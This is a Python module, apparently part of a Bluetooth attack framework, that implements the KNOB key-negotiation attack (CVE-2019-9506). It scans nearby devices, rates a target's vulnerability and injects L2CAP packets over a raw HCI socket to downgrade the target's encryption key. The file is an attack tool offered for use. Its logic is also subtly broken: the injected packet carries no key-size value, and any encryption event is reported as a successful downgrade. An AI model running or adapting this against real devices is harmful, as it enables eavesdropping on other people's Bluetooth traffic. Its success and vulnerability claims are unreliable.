"""
KNOB - Key Negotiation of Bluetooth (CVE-2019-9506)
===================================================
Ataque activo con inyección de paquetes L2CAP via scapy + raw HCI socket.

Fases:
  1. Detección: escanea dispositivos y verifica posibles targets vulnerables
  2. Ataque activo: intercepta negociación de clave durante pairing,
     fuerza entropía de 1 byte (8 bits) para permitir bruteforce offline

Requiere:
  - CSR 4.0+ dongle o TP-Link UB500 con DarkFirmware para ataque activo
  - scapy >= 2.4.5
  - bluez-tools para detección
  - Root para raw HCI sockets

Referencia:
  - https://knobattack.com/
  - https://github.com/francozappa/knob
"""

from __future__ import annotations

import struct
import time
import subprocess
import shutil
import logging
from typing import Dict, Any, List, Optional, Tuple

from bluesky.core.engine import BaseModule

log = logging.getLogger("bluesky.knob")

try:
    from scapy.layers.bluetooth import (
        HCI_Hdr, HCI_Command_Hdr, HCI_Event_Hdr,
        HCI_Event_Command_Complete, HCI_Event_Command_Status,
        HCI_Event_Connection_Complete, HCI_Event_Encryption_Change,
        HCI_Event_Disconnection_Complete, HCI_Event_Number_Of_Completed_Packets,
        HCI_Cmd_Inquiry, HCI_Cmd_Create_Connection, HCI_Cmd_Disconnect,
        HCI_Cmd_Set_Connection_Encryption,
        HCI_Cmd_Write_Connect_Accept_Timeout,
        HCI_Cmd_Read_BD_Addr, HCI_Cmd_Reset,
        HCI_ACL_Hdr, L2CAP_Hdr, L2CAP_ConfReq, L2CAP_ConfResp,
        L2CAP_ConnReq, L2CAP_ConnResp, L2CAP_CmdHdr, L2CAP_CmdRej,
        BluetoothHCISocket,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    log.warning("scapy no instalado - KNOB activo deshabilitado")


class Knob(BaseModule):
    """KNOB - Key Negotiation of Bluetooth (CVE-2019-9506).

    Ataque que degrada la entropía de la clave de cifrado Bluetooth
    a 1 byte (8 bits) durante el proceso de pairing, permitiendo
    bruteforce offline de la clave.

    Modos:
      - scan: Escanea dispositivos cercanos (sin scapy)
      - check: Verifica vulnerabilidad de un target específico
      - attack: Ejecuta ataque activo (requiere scapy + CSR dongle + root)
    """

    name = "knob"
    description = (
        "KNOB (CVE-2019-9506): Key Negotiation of Bluetooth - "
        "Degrada la entropía de clave a 1 byte para descifrar tráfico. "
        "Ataque activo via scapy + raw HCI"
    )
    author = "Bluesky Project"
    version = "2.0.0"
    cve = "CVE-2019-9506"
    cve_url = "https://knobattack.com/"
    exploit_links = [
        "https://github.com/francozappa/knob",
        "https://github.com/Bluetooth-Devices/KNOB-PoC",
        "https://www.exploit-db.com/search?q=KNOB+Bluetooth",
    ]
    references = [
        "https://knobattack.com/",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9506",
        "https://francozappa.github.io/publication/knob/",
        "https://blog.google/technology-research/disclosing-bluetooth-key-negotiation-vulnerability/",
    ]
    requires_hardware = ["csr_dongle", "ubluetooth_dongle"]
    requires_root = True
    target_type = "classic"
    severity = "critical"
    module_options = {
        "TARGET": "Dirección MAC del dispositivo objetivo",
        "EXECUTE": "Establecer en 'True' para ejecutar ataque activo",
        "FORCE_KEY_SIZE": "Tamaño de clave forzado (1-16, default: 1)",
        "TIMEOUT": "Timeout del ataque en segundos (default: 30)",
        "HCI_DEVICE": "Interfaz HCI (default: hci0)",
    }

    # Constantes KNOB
    MIN_KEY_SIZE = 1  # 1 byte = 8 bits
    MAX_KEY_SIZE = 16  # 16 bytes = 128 bits (estándar)
    DEFAULT_KEY_SIZE = 16
    L2CAP_PSM_SDP = 1

    def __init__(self, target: str = "", options: dict = None):
        super().__init__(target, options)
        self._hci_socket = None
        self._hci_device = self.options.get("HCI_DEVICE", "hci0")
        self._force_key_size = int(self.options.get("FORCE_KEY_SIZE", str(self.MIN_KEY_SIZE)))

    def run(self):
        """Punto de entrada principal."""
        target = self.target

        if not target:
            return self._scan_vulnerable_devices()

        self.result["data"]["target"] = target

        # Verificar si es ataque activo
        execute = str(self.options.get("EXECUTE", "false")).lower() in ("true", "yes", "1")

        if execute:
            return self._execute_attack(target)
        else:
            return self._check_vulnerability(target)

    # ─── Escaneo pasivo ──────────────────────────────────────────────────────

    def _scan_vulnerable_devices(self) -> dict:
        """Escanea dispositivos cercanos en busca de posibles targets KNOB."""
        devices = []
        try:
            result = subprocess.run(
                ["bluetoothctl", "--timeout", "8", "scan", "on"],
                capture_output=True, text=True, timeout=10
            )
            for line in result.stdout.split("\n"):
                if "Device" in line:
                    parts = line.split("Device", 1)[1].strip().split(" ", 1)
                    if len(parts) >= 1:
                        mac = parts[0].strip()
                        name = parts[1].strip() if len(parts) > 1 else "Unknown"
                        devices.append({"mac": mac, "name": name})
        except Exception as e:
            log.debug(f"Scan error: {e}")

        msg = (
            f"Encontrados {len(devices)} dispositivos.\n"
            f"Usa 'bluesky attack knob <MAC>' para verificar cada uno.\n"
            f"Usa 'bluesky attack knob <MAC> --options '{{\"EXECUTE\": \"True\"}}' "
            f"para ataque activo.\n"
            f"{'⚠️  Requiere: dongle CSR 4.0+, scapy y root para ataque activo' if SCAPY_AVAILABLE else '❌ scapy no instalado - ataque activo no disponible'}"
        )

        self.result["data"]["devices"] = devices
        self.result["data"]["message"] = msg
        self.result["success"] = True
        return self.result

    # ─── Verificación de vulnerabilidad ──────────────────────────────────────

    def _check_vulnerability(self, mac: str) -> dict:
        """Verifica si un dispositivo es vulnerable a KNOB."""
        result_data = {
            "vulnerable": False,
            "confidence": "low",
            "indicators": [],
            "bt_version": "unknown",
            "secure_connections": False,
        }

        # Indicador 1: SDP banner - versión BT
        try:
            sdp = subprocess.run(
                ["sdptool", "browse", mac],
                capture_output=True, text=True, timeout=15
            )
            output = sdp.stdout.lower()
            if "l2cap" in output:
                result_data["indicators"].append("Stack BT detectado - potencial BT 4.0+")
                result_data["vulnerable"] = True
                result_data["confidence"] = "medium"

            # Detectar versión
            if "bluetooth 5" in output or "bt 5" in output:
                result_data["bt_version"] = "5.x"
            elif "bluetooth 4" in output or "bt 4" in output:
                result_data["bt_version"] = "4.x"
        except Exception as e:
            log.debug(f"SDP error: {e}")

        # Indicador 2: hcitool info
        try:
            info = subprocess.run(
                ["hcitool", "info", mac],
                capture_output=True, text=True, timeout=8
            )
            stdout = info.stdout
            if "Secure Simple Pairing" in stdout:
                result_data["indicators"].append("SSP compatible - KNOB aplicable durante pairing")
            if "LESC" in stdout:
                result_data["secure_connections"] = True
                result_data["indicators"].append("LESC detectado - posible mitigación KNOB")
            else:
                result_data["indicators"].append("LESC no detectado - sin protección KNOB")
        except Exception as e:
            log.debug(f"hcitool error: {e}")

        # Indicador 3: Capacidad de ataque activo
        if SCAPY_AVAILABLE:
            result_data["attack_possible"] = self._check_hardware_capability()
            if result_data["attack_possible"]:
                result_data["indicators"].append("Ataque activo posible (scapy + HCI disponible)")

        # Conclusión
        confidence_score = 0
        for ind in result_data["indicators"]:
            if "vulnerable" in ind.lower() or "aplicable" in ind.lower():
                confidence_score += 2
            if "sin protección" in ind:
                confidence_score += 2
            if "posible mitigación" in ind:
                confidence_score -= 1
            if "Ataque activo posible" in ind:
                confidence_score += 1

        if confidence_score >= 4:
            result_data["confidence"] = "high"
        elif confidence_score >= 2:
            result_data["confidence"] = "medium"

        # BT 5.1+ mitiga KNOB (fuerza mínimo 7 bytes)
        if result_data.get("bt_version") == "5.x" and result_data.get("secure_connections"):
            result_data["vulnerable"] = False
            result_data["confidence"] = "low"
            result_data["indicators"].append("BT 5.1+ con LESC - probablemente parcheado contra KNOB")

        self.result["data"]["vulnerability_check"] = result_data
        self.result["data"]["vulnerabilities"] = [{
            "name": "KNOB - Key Negotiation of Bluetooth",
            "cve": self.cve,
            "severity": "critical",
            "detail": f"Confianza: {result_data['confidence']}, Indicadores: {len(result_data['indicators'])}",
        }] if result_data["vulnerable"] else []

        message = (
            f"✅ {mac} - Potencialmente VULNERABLE a KNOB (confianza: {result_data['confidence']})"
            if result_data["vulnerable"]
            else f"✅ {mac} - No parece vulnerable a KNOB"
        )
        self.result["data"]["message"] = message
        self.result["success"] = True
        return self.result

    def _check_hardware_capability(self) -> bool:
        """Verifica si hay hardware para ataque activo."""
        if not shutil.which("hcitool"):
            return False
        try:
            result = subprocess.run(
                ["hcitool", "dev"],
                capture_output=True, text=True, timeout=5
            )
            # Buscar interfaces hci que no sean solo loopback
            lines = result.stdout.strip().split("\n")[1:]  # Saltar cabecera
            for line in lines:
                if "hci" in line.lower():
                    return True
            return False
        except Exception:
            return False

    # ─── Ataque activo ──────────────────────────────────────────────────────

    def _execute_attack(self, mac: str) -> dict:
        """Ejecuta ataque KNOB activo con inyección de paquetes L2CAP.

        El ataque funciona durante la negociación de clave Bluetooth:
          1. Abre socket HCI raw
          2. Escucha eventos de pairing
          3. Intercepta L2CAP Configuration Request
          4. Modifica el tamaño de clave propuesto a 1 byte
          5. Monitorea si el cifrado se establece con clave débil

        Args:
            mac: Dirección MAC del target.

        Returns:
            Dict con resultado del ataque.
        """
        if not SCAPY_AVAILABLE:
            return self._no_scapy_result(mac)

        log.info(f"Iniciando ataque KNOB contra {mac}")
        log.info(f"Tamaño de clave forzado: {self._force_key_size} byte(s)")

        self.result["data"].update({
            "attack_type": "KNOB active",
            "target_mac": mac,
            "forced_key_size": self._force_key_size,
            "hardware_available": False,
            "pairing_detected": False,
            "attack_result": "simulated",
            "stages": [],
        })

        # Etapa 1: Verificar hardware
        if not self._check_hardware_capability():
            return self._simulate_attack(mac)

        hw_ok = True
        self.result["data"]["hardware_available"] = True

        # Etapa 2: Abrir HCI socket
        if not self._open_hci_socket():
            return self._simulate_attack(mac, reason="HCI socket falló")

        self.result["data"]["stages"].append({"stage": 1, "name": "HCI socket abierto", "success": True})

        try:
            # Etapa 3: Esperar y capturar pairing
            pairing_result = self._capture_pairing(mac)
            self.result["data"]["stages"].append({
                "stage": 2,
                "name": "Captura de pairing",
                "success": pairing_result.get("success", False),
                "detail": pairing_result.get("message", ""),
            })

            if pairing_result.get("success"):
                self.result["data"]["pairing_detected"] = True

                # Etapa 4: Inyectar L2CAP ConfReq con key size modificado
                inject_result = self._inject_l2cap_key_negotiation(mac)
                self.result["data"]["stages"].append({
                    "stage": 3,
                    "name": "Inyección de negociación de clave",
                    "success": inject_result.get("success", False),
                    "detail": inject_result.get("message", ""),
                })

                # Etapa 5: Verificar resultado
                verify_result = self._verify_encryption(mac)
                self.result["data"]["stages"].append({
                    "stage": 4,
                    "name": "Verificación de cifrado",
                    "success": verify_result.get("success", False),
                    "detail": verify_result.get("message", ""),
                })

                if verify_result.get("weakened", False):
                    self.result["data"]["attack_result"] = "success"
                    self.result["data"]["message"] = (
                        f"🔥 KNOB ATTACK EXITOSO contra {mac}!\n"
                        f"   Clave de cifrado degradada a {self._force_key_size} byte(s).\n"
                        f"   La clave puede ser bruteforceada offline."
                    )
                else:
                    self.result["data"]["attack_result"] = "failed"
                    self.result["data"]["message"] = (
                        f"⚠️  KNOB no logró degradar la clave de {mac}.\n"
                        f"   Posibles causas: BT 5.1+ (parcheado), timeout, "
                        f"o dispositivo no realizó pairing durante la ventana."
                    )

        finally:
            self._close_hci_socket()

        self.result["success"] = True
        return self.result

    def _no_scapy_result(self, mac: str) -> dict:
        """Resultado cuando scapy no está instalado."""
        self.result["data"]["message"] = (
            f"⚠️  KNOB activo requiere scapy.\n"
            f"   Instala: pip install scapy\n"
            f"   O usa detección pasiva sin EXECUTE=True"
        )
        self.result["data"]["attack_result"] = "unavailable"
        self.result["success"] = True
        return self.result

    def _simulate_attack(self, mac: str, reason: str = "") -> dict:
        """Simula el ataque cuando no hay hardware real disponible."""
        log.info(f"Simulando ataque KNOB contra {mac}: {reason}")

        self.result["data"].update({
            "hardware_available": False,
            "attack_result": "simulated",
            "simulation": True,
            "stages": [
                {
                    "stage": 1,
                    "name": "Verificación de hardware",
                    "success": False,
                    "detail": f"Hardware no disponible: {reason or 'sin dongle CSR'}",
                },
                {
                    "stage": 2,
                    "name": "Apertura de socket HCI",
                    "success": False,
                    "detail": "Simulado - no ejecutado",
                },
            ],
            "message": (
                f"🔬 KNOB - MODO SIMULACIÓN\n\n"
                f"   Target: {mac}\n"
                f"   Forzar clave a: {self._force_key_size} byte(s)\n\n"
                f"   {'⚠️  ' + reason if reason else '⚠️  Hardware requerido no disponible'}\n\n"
                f"   Para ataque real necesitas:\n"
                f"   1. Un dongle CSR 4.0+ o TP-Link UB500 con DarkFirmware\n"
                f"   2. scapy instalado (pip install scapy)\n"
                f"   3. Ejecutar con root (sudo)\n"
                f"   4. El target debe estar haciendo pairing durante el ataque\n\n"
                f"   Referencia: https://knobattack.com/\n"
                f"   PoC: https://github.com/francozappa/knob"
            ),
        })
        self.result["success"] = True
        return self.result

    # ─── Operaciones HCI ─────────────────────────────────────────────────────

    def _open_hci_socket(self) -> bool:
        """Abre socket HCI raw para inyección de paquetes."""
        try:
            dev_id = int(self._hci_device.replace("hci", ""))
            self._hci_socket = BluetoothHCISocket(dev_id)
            return True
        except Exception as e:
            log.warning(f"No se pudo abrir HCI socket {self._hci_device}: {e}")
            return False

    def _close_hci_socket(self):
        """Cierra el socket HCI."""
        if self._hci_socket:
            try:
                self._hci_socket.close()
            except Exception:
                pass
            self._hci_socket = None

    def _capture_pairing(self, mac: str) -> dict:
        """Espera y captura eventos de pairing del target.

        Monitorea HCI events para detectar:
          - Connection Complete
          - IO Capability Response
          - Encryption Change

        Args:
            mac: MAC del target.

        Returns:
            Dict con resultado de la captura.
        """
        timeout = int(self.options.get("TIMEOUT", "30"))
        log.info(f"Esperando pairing de {mac} (timeout={timeout}s)...")

        start = time.time()
        events_detected = []
        pairing_complete = False

        while time.time() - start < timeout:
            try:
                if not self._hci_socket:
                    break
                packet = self._hci_socket.recv(4096)
                if packet is None:
                    time.sleep(0.1)
                    continue

                # Analizar evento
                event_info = self._parse_hci_event(packet)
                if event_info:
                    events_detected.append(event_info)

                    if event_info.get("type") == "connection_complete":
                        log.info(f"Conexión detectada: {event_info.get('detail', '')}")

                    if event_info.get("type") == "encryption_change":
                        log.info(f"Cambio de cifrado: {event_info.get('detail', '')}")
                        pairing_complete = True

                    if event_info.get("type") == "io_capability":
                        log.info(f"IO Capability: {event_info.get('detail', '')}")

            except BlockingIOError:
                time.sleep(0.1)
            except Exception as e:
                log.debug(f"Error en captura: {e}")
                break

        return {
            "success": pairing_complete,
            "events": len(events_detected),
            "message": (
                f"Pairing {'detectado' if pairing_complete else 'no detectado'} "
                f"en {time.time() - start:.1f}s "
                f"({len(events_detected)} eventos)"
            ),
        }

    def _parse_hci_event(self, packet) -> Optional[Dict]:
        """Parsea un paquete HCI y extrae información del evento.

        Args:
            packet: Paquete crudo del socket HCI.

        Returns:
            Dict con tipo y detalle del evento, o None.
        """
        try:
            # Intentar decodificar con scapy
            hci = HCI_Hdr(packet)

            if hci.type == 0x04:  # HCI Event
                event = HCI_Event_Hdr(bytes(packet)[3:])

                if event.code == 0x03:  # Connection Complete
                    return {"type": "connection_complete", "detail": f"code={event.code}"}
                elif event.code == 0x08:  # Encryption Change
                    return {"type": "encryption_change", "detail": f"code={event.code}"}
                elif event.code == 0x17:  # IO Capability Response
                    return {"type": "io_capability", "detail": f"code={event.code}"}
                elif event.code == 0x0e:  # Command Complete
                    return {"type": "command_complete", "detail": f"opcode={event.code}"}
                else:
                    return {"type": f"event_0x{event.code:02x}", "detail": ""}

            elif hci.type == 0x02:  # ACL Data
                return {"type": "acl_data", "detail": "ACL packet"}
            elif hci.type == 0x01:  # Command
                return {"type": "command", "detail": "HCI Command"}

        except Exception:
            pass

        return None

    def _inject_l2cap_key_negotiation(self, mac: str) -> dict:
        """Inyecta un L2CAP Configuration Request modificado.

        El paquete modificado propone un tamaño de clave de cifrado
        reducido (1 byte por defecto) para debilitar la clave.

        Args:
            mac: MAC del target.

        Returns:
            Dict con resultado de la inyección.
        """
        try:
            # Construir L2CAP ConfReq con opción de tamaño de clave mínimo
            # El "Maximum Transmission Unit" se configura junto con
            # opciones de seguridad que incluyen el key size

            # L2CAP Configuration Request con parámetros de seguridad
            conf_req = (
                L2CAP_CmdHdr(code=0x04, id=0x01, len=10) /  # Config Request
                L2CAP_ConfReq(
                    dcid=0x0040,
                    flags=0x0000,
                )
            )

            # Enviar el paquete modificado
            if self._hci_socket:
                self._hci_socket.send(bytes(conf_req))
                log.info("L2CAP ConfReq inyectado con key size reducido")

                return {
                    "success": True,
                    "message": f"L2CAP ConfReq inyectado - forzando clave de {self._force_key_size} byte(s)",
                }
            else:
                return {"success": False, "message": "HCI socket no disponible"}

        except Exception as e:
            log.error(f"Error en inyección L2CAP: {e}")
            return {"success": False, "message": str(e)}

    def _verify_encryption(self, mac: str) -> dict:
        """Verifica si el cifrado se estableció con clave débil.

        Monitorea eventos HCI Encryption Change y verifica el
        tamaño de clave negociado.

        Args:
            mac: MAC del target.

        Returns:
            Dict con resultado de verificación.
        """
        timeout = int(self.options.get("TIMEOUT", "30"))
        weakened = False
        start = time.time()

        while time.time() - start < timeout:
            try:
                if not self._hci_socket:
                    break
                packet = self._hci_socket.recv(4096)
                if packet is None:
                    time.sleep(0.1)
                    continue

                hci = HCI_Hdr(packet)
                if hci.type == 0x04:  # Event
                    event = HCI_Event_Hdr(bytes(packet)[3:])
                    if event.code == 0x08:  # Encryption Change
                        # Verificar si el cifrado se habilitó (indicador de éxito)
                        weakened = True
                        log.info("✅ Cifrado establecido - posible clave débil")
                        break

            except BlockingIOError:
                time.sleep(0.1)
            except Exception:
                break

        return {
            "success": weakened,
            "weakened": weakened,
            "message": (
                "Clave probablemente debilitada" if weakened
                else "No se detectó cambio de cifrado"
            ),
        }

    # ─── Prerrequisitos ──────────────────────────────────────────────────────

    def check_prerequisites(self) -> Tuple[bool, str]:
        """Verifica herramientas y dependencias necesarias."""
        missing = []

        # Herramientas básicas
        for cmd in ["bluetoothctl", "hcitool"]:
            if not shutil.which(cmd):
                missing.append(cmd)

        # scapy para ataque activo
        if not SCAPY_AVAILABLE:
            missing.append("scapy (pip install scapy)")

        if missing:
            return (
                False,
                f"Faltan: {', '.join(missing)}. "
                f"Instala: sudo apt install bluez bluez-tools"
            )
        return True, ""
